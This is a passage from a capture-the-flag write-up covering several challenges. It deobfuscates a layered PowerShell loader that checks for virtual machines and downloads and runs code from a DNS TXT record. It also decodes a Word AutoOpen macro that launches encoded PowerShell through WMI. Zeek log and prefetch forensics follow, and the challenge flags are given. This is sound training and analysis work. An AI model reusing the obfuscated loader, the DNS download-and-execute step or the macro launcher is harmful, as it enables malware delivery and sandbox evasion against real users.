b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

If you separate it in smaller chunks using parenthesis you can reassemble big strings, do substitution and finally obtain something to work on but the task is tedious.

I had to use the Powershell interpreter to execute some parts but I found another solution that I think would be more useful.

You will need [PSDecode](https://github.com/R3MRUM/PSDecode) which is a deobfuscation tool for Powershell.

Of course if requires Windows + Powershell but it is worth it.

Then you deobfuscate the code:

```
PS C:\Users\User> PSDecode .\Desktop\bad.ps1


############################## Layer 1 ##############################
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')



############################## Layer 2 ##############################
(('. ( ZT6ENv:CoMSpEc[4,24,25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+hx6l (REDhx6+hx6AeRmaertS.oIhx6+hx6 thx6+hx6Chx6+hx6ejbO-Whx6+hx6En { HCaERoFhx6+hx6fKI) sSERpMoCehx6+hx6dhx6+hx6::hx6+hx6]edOMhx6+hx6nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b0Yhx6+hx6==wDyD4p+Ss/l/hx6+hx6i+5GtatJKyfNjOhx6+hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6zzUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCwhx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+hx6ugkTBFTcCPaSH0QjpFywhx6+hx6aQyhx6+hx6HtPUGhx6+hx6DL0BK3hx6+hx6lClrHAvhx6+hx64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpckC9EGhx6+hx6gIaf96jSmShx6+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31XqKhx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxVhx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66eshx6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsSerPmoc.OI.mehx6+hx6TsYShx6+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((noIsseRpXe-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')



############################## Layer 3 ##############################
. ( $ENv:CoMSpEc[4,24,25]-join'')( " $( Set-variaBle 'OfS' '')"+ ( [StriNg] [rEGeX]::mAtcheS( " ))421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,'kwl'EcalPeRC-  )')b0Yb0YniOj-]52,42,4[cepSMoC:Vnekwl ( . fKI ) (DnEOTDAer.)} ) iicsA::]GnidOcNe.Txet.METsys[ ,_kwl (REDAeRmaertS.oI tCejbO-WEn { HCaERoFfKI) sSERpMoCed::]edOMnOisSErPMoc.NoISSerpMOc.oi[, ) b0Y==wDyD4p+Ss/l/i+5GtatJKyfNjO334Vvj6wRyRXe1xy1pB0AXVLMgOwY//WomzzUtBsx/ie0rVZ7xcLiowWMGEVjk7JMfxVmuszOT3XkKu9TvOsrbbcbGyZ6c/gYNpilBK7x5Plc8qUyOhBYVecjNLW42YjM8SwtAaR8IOwm6UwWNmWzCwVrSr7IT2k6Mj1MuKT/oRO5BKK8R3NhDom2AGYpyaTaNg8DAneNoeSjugkTBFTcCPaSH0QjpFywaQyHtPUGDL0BK3lClrHAv4GOpVKUNmGzIDeraEvlpckC9EGgIaf96jSmSMhhRfI72oHzUkDsZoT5nc7MD8W31XqKd4dbtbth1RdSigEaEJNERMLUxVME4PJtUtSIJUZfZEEAJsTdDZNb0Y(gniRTS46esaBmoRF::]tRevnOC[]MAertsYrOmeM.Oi.mETSYs[ (MaErtsEtALfeD.NOIsSerPmoc.OI.meTsYS  tCejbO-WEn ( '(((noIsseRpXe-ekovni ",'.','RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" )



############################## Layer 4 ##############################
  invoke-eXpRessIon(((' ( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing(Y0bNZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==Y0b ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )IKfFoREaCH { nEW-ObjeCt Io.StreamReADER( lwk_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( ) IKf . ( lwkenV:CoMSpec[4,24,25]-jOinY0bY0b)')  -CRePlacE'lwk',[ChAR]36  -CRePlacE ([ChAR]89+[ChAR]48+[ChAR]98),[ChAR]39  -RePLACe'IKf',[ChAR]124))



############################## Layer 5 ##############################
 ( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH { nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( ) | . ( $enV:CoMSpec[4,24,25]-jOin'')



############################## Actions ##############################
No actions Identified. Methods executed by the script may not have corresponding override methods defined.
```

It didn't solve the final step, but it is a lot better.

Now we still have to decode some base64 and uncompress using deflate. The critical point was to add another parameter to `zlib.decompress`:

```python
>>> import base64
>>> import zlib
>>> base64_data = "NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw=="
>>> binary_data = base64.b64decode(base64_data)
>>> decompressed_data = zlib.decompress(binary_data, -zlib.MAX_WBITS)
>>> print(decompressed_data.decode())
try {$TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; if ($error.Count -eq 0) { $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
```

The first instruction [is just a way to detect if the code is running inside a VM](https://debugactiveprocess.medium.com/anti-vm-techniques-with-msacpi-thermalzonetemperature-32cfeecda802).

The second part perform a DNS request of type TXT for the domain `eventlog.zip`.

The code then looks for base64 strings and decode it. Let's see what we can find there:

```console
$ dig -t TXT eventlog.zip

; <<>> DiG 9.18.12-0ubuntu0.22.04.3-Ubuntu <<>> -t TXT eventlog.zip
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44497
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;eventlog.zip.                  IN      TXT

;; ANSWER SECTION:
eventlog.zip.           3600    IN      TXT     "U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg=="

;; Query time: 52 msec
;; SERVER: ::1#53(::1) (UDP)
;; WHEN: Thu Oct 19 09:54:09 CEST 2023
;; MSG SIZE  rcvd: 178
```

And finally

```console
$ echo U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg== | base64 -d
Start-Process "https://youtu.be/561nnd9Ebss?t=16"
#flag{409537347c2fae01ef9826c2506ac660}#
```

## Traffic

### Description

> We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?
>
> Some tools like rita or zeek might help dig through all of this data!

### Solution

Get the file

```bash
wget -O traffic.7z https://huntress.ctf.games/files/efd8115eedbda53848676208e38e6afc/traffic.7z?token=eyJ1c2VyX2lkIjozMjIwLCJ0ZWFtX2lkIjo0MDgsImZpbGVfaWQiOjd9.ZR16QA.wjQwJefS3dqMnEPwq5ruosfr4H8
```

Unzip it

```bash
7z x traffic.7z
cd 2021-09-08
```

List the content

```bash
ls -1
capture_loss.00:00:00-01:00:00.log.gz
capture_loss.01:00:00-02:00:00.log.gz
capture_loss.02:16:42-03:00:00.log.gz
capture_loss.03:00:00-03:53:19.log.gz
capture_loss.03:53:19-03:53:21.log.gz
conn-summary.00:00:00-01:00:00.log.gz
conn-summary.01:00:00-02:00:00.log.gz
conn-summary.02:00:00-02:01:50.log.gz
conn-summary.02:15:56-03:00:00.log.gz
conn-summary.03:00:00-03:53:19.log.gz
conn-summary.03:53:19-03:53:21.log.gz
conn.00:00:00-01:00:00.log.gz
conn.01:00:00-02:00:00.log.gz
conn.02:00:00-02:01:50.log.gz
conn.02:15:56-03:00:00.log.gz
conn.03:00:00-03:53:19.log.gz
conn.03:53:19-03:53:21.log.gz
dns.00:00:00-01:00:00.log.gz
dns.01:00:00-02:00:00.log.gz
dns.02:00:00-02:01:50.log.gz
dns.02:15:46-03:00:00.log.gz
dns.03:00:00-03:53:19.log.gz
files.00:00:00-01:00:00.log.gz
files.01:00:00-02:00:00.log.gz
files.02:00:00-02:01:50.log.gz
files.02:15:51-03:00:00.log.gz
files.03:00:00-03:53:19.log.gz
http.00:00:00-01:00:00.log.gz
http.01:00:00-02:00:00.log.gz
http.02:15:51-03:00:00.log.gz
http.03:00:00-03:53:19.log.gz
known_hosts.02:15:46-03:00:00.log.gz
loaded_scripts.02:15:42-03:00:00.log.gz
notice.00:00:00-01:00:00.log.gz
notice.01:00:00-02:00:00.log.gz
notice.02:20:05-03:00:00.log.gz
notice.03:00:00-03:53:19.log.gz
ocsp.00:00:00-01:00:00.log.gz
ocsp.01:00:00-02:00:00.log.gz
ocsp.02:00:00-02:01:50.log.gz
ocsp.02:16:08-03:00:00.log.gz
ocsp.03:00:00-03:53:19.log.gz
packet_filter.02:15:42-03:00:00.log.gz
reporter.00:00:00-01:00:00.log.gz
reporter.03:53:19-03:53:19.log.gz
software.02:15:51-03:00:00.log.gz
ssl.00:00:00-01:00:00.log.gz
ssl.01:00:00-02:00:00.log.gz
ssl.02:00:00-02:01:50.log.gz
ssl.02:15:47-03:00:00.log.gz
ssl.03:00:00-03:53:19.log.gz
stats.00:00:00-01:00:00.log.gz
stats.01:00:00-02:00:00.log.gz
stats.02:15:42-03:00:00.log.gz
stats.03:00:00-03:53:19.log.gz
stats.03:53:19-03:53:21.log.gz
stderr.02:15:41-03:53:21.log.gz
stdout.02:15:41-03:53:21.log.gz
weird.00:00:00-01:00:00.log.gz
weird.02:16:09-03:00:00.log.gz
weird.03:00:00-03:53:19.log.gz
x509.00:00:00-01:00:00.log.gz
x509.01:00:00-02:00:00.log.gz
x509.02:15:48-03:00:00.log.gz
x509.03:00:00-03:53:19.log.gz
```

Naive grep 

```bash
zcat * | grep sketchy
```

=> Found `sketchysite.github.io` !

In reality, I've read Zeek log format here https://docs.zeek.org/en/master/log-formats.html#zeek-tsv-format-and-awk, then I tried the command below and got the result (:

```bash
zcat dns.* | awk '/^[^#]/ {print $3, $10, $22}' | grep sket
```

## Tragedy (Redux)

### Description

> We found this file as part of an attack chain that seemed to manipulate file contents to stage a payload. Can you make any sense of it?

### Solution

The first post of the challenge was a real tragedy as the archive did contain the flag in a txt file!

It was a mistake and the CTF staff posted the fixed challenge under the name `Tragedy Redux`.

You get a 7z file which contains a zip file whose content seems to be a docx document:

```console
$ unzip -d tragedy tragedy_redux.zip
Archive:  tragedy_redux.zip
file #1:  bad zipfile offset (local header sig):  0
  inflating: tragedy/_rels/.rels
  inflating: tragedy/word/document.xml
  inflating: tragedy/word/_rels/document.xml.rels
  inflating: tragedy/word/vbaProject.bin
  inflating: tragedy/word/theme/theme1.xml
  inflating: tragedy/word/_rels/vbaProject.bin.rels
  inflating: tragedy/word/vbaData.xml
  inflating: tragedy/word/settings.xml
  inflating: tragedy/word/styles.xml
  inflating: tragedy/word/webSettings.xml
  inflating: tragedy/word/fontTable.xml
  inflating: tragedy/docProps/core.xml
  inflating: tragedy/docProps/app.xml
```

Unfortunately you can't just rename the zip to docx and open it in LibreOffice.

I used grep to find the flag, but it wasn't so easy to get.

I chose to take an in-depth look to the `vbaProject.bin` which is apparently where macros are stored but in a Microsoft-ish format.

After some time I found [an old program for Windows](https://github.com/fboldewin/reconstructer.org/blob/master/OfficeMalScanner.zip) able to extract VBA code from the bin file.

```console
$ wine OfficeMalScanner.exe vbaProject.bin info

+------------------------------------------+
|           OfficeMalScanner v0.62         |
|  Frank Boldewin / www.reconstructer.org  |
+------------------------------------------+

[*] INFO mode selected
[*] Opening file vbaProject.bin
[*] Filesize is 22016 (0x5600) Bytes
[*] Ms Office OLE2 Compound Format document detected

-----------------------------------------
[Scanning for VB-code in VBAPROJECT.BIN]
-----------------------------------------
NewMacros
ThisDocument
-----------------------------------------------------------------------------
                VB-MACRO CODE WAS FOUND INSIDE THIS FILE!
               The decompressed Macro code was stored here:

------> Z:\tmp\OfficeMalScanner\VBAPROJECT.BIN-Macros
-----------------------------------------------------------------------------
```

We have the following code in the `NewMacros` file with a call to `AutoOpen()` which suggest it is the main thing

```vba
Attribute VB_Name = "NewMacros"
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()

    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

I'm not familiar with VBA, so it took me some time to rewrite it using Python:

```python
def Pears(c: int) -> str:
    return chr(c - 17)

def Strawberries(s: str) -> str:
    return s[:3]

def Almonds(s: str) -> str:
    return s[3:]

def Nuts(s: str):
    oat_milk = ""
    while True:
        oat_milk = oat_milk + Pears(int(Strawberries(s)))
        s = Almonds(s)
        if len(s) <= 0:
            break
    return oat_milk

def Bears(s: str) -> str:
    return s[::-1]

print(Nuts("129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"))
print(Nuts("136122127126120126133132075"))
print(Nuts("104122127068067112097131128116118132132"))
```

The decoded strings are:

```
powershell -enc JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==
winmgmts:
Win32_Process
```

And of course the base64 string decodes to the flag.

## Wimble

### Description

> "Gretchen, stop trying to make fetch happen! It's not going to happen!" - Regina George, Mean Girls

### Solution

You get a `wimble.7z` that uncompress to a file called `fetch`:

```console
$ file fetch
fetch: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup
```

That format seems like an equivalent of Apple's DMG.

You can extract the content using any kind of archiving tool like the graphical `file-roller` that comes with Gnome or Xarchiver.

Once extracted there are a lot of prefetch (`.pf`) files. Those are files generated by the Windows operating system when you lanch an executable.

The aim is to speed up execution at next launch (as far as I remember).

Those are also interesting files for computer forensics because they can give an in-depth idead of what was executed on a computer and when.

There are FOSS tools out there but a lot are outdated.

The best way seems to use a tool available for the Linux distribution:

```
libscca-utils - Windows Prefetch File access library -- Utilities
```

You can't use the tool on a directory so let's use `find`:

```console
$ find ../toto -name "*.pf" -exec sccainfo {} \; | grep -i flag
Unable to open: ../toto/SVCHOST.EXE-04F53BBC.pf.
libscca_io_handle_read_compressed_file_header: unsupported signature.
libscca_file_open_read: unable to read file header.
libscca_file_open_file_io_handle: unable to read from file handle.
libscca_file_open: unable to open file: ../toto/SVCHOST.EXE-04F53BBC.pf.
info_handle_open_input: unable to open input file.
Unable to open: ../toto/DLLHOST.EXE-5A1B6910.pf.
libscca_io_handle_read_compressed_file_header: unsupported signature.
libscca_file_open_read: unable to read file header.
libscca_file_open_file_io_handle: unable to read from file handle.
libscca_file_open: unable to open file: ../toto/DLLHOST.EXE-5A1B6910.pf.
info_handle_open_input: unable to open input file.
        Filename: 62                    : \VOLUME{01d89fa75d2a9f57-245d3454}\USERS\LOCAL_ADMIN\DESKTOP\FLAG{97F33C9783C21DF85D79D613B0B258BD}
Unable to open: ../toto/yolo2/SVCHOST.EXE-04F53BBC.pf.
libscca_io_handle_read_compressed_file_header: unsupported signature.
libscca_file_open_read: unable to read file header.
libscca_file_open_file_io_handle: unable to read from file handle.
libscca_file_open: unable to open file: ../toto/yolo2/SVCHOST.EXE-04F53BBC.pf.
info_handle_open_input: unable to open input file.
Unable to open: ../toto/yolo2/DLLHOST.EXE-5A1B6910.pf.
libscca_io_handle_read_compressed_file_header: unsupported signature.
libscca_file_open_read: unable to read file header.
libscca_file_open_file_io_handle: unable to read from file handle.
libscca_file_open: unable to open file: ../toto/yolo2/DLLHOST.EXE-5A1B6910.pf.
info_handle_open_input: unable to open input file.
        Filename: 62                    : \VOLUME{01d89fa75d2a9f57-245d3454}\USERS\LOCAL_ADMIN\DESKTOP\FLAG{97F33C9783C21DF85D79D613B0B258BD}
Unable to open: ../toto/yolo2/MOBSYNC.EXE-B307E1CC.pf.
libscca_io_handle_read_compressed_file_header: unsupported signature.
libscca_file_open_read: unable to read file header.
libscca_file_open_file_io_handle: unable to read from file handle.
libscca_file_open: unable to open file: ../toto/yolo2/MOBSYNC.EXE-B307E1CC.pf.
info_handle_open_input: unable to open input file.
Unable to open: ../toto/MOBSYNC.EXE-B307E1CC.pf.
libscca_io_handle_read_compressed_file_header: unsupported signature.
libscca_file_open_read: unable to read file header.
libscca_file_open_file_io_handle: unable to read from file handle.
libscca_file_open: unable to open file: ../toto/MOBSYNC.EXE-B307E1CC.pf.
info_handle_open_input: unable to open input file.
```

Here we can see the flag in the path `\USERS\LOCAL_ADMIN\DESKTOP\FLAG{97F33C9783C21DF85D79D613B0B258BD}`
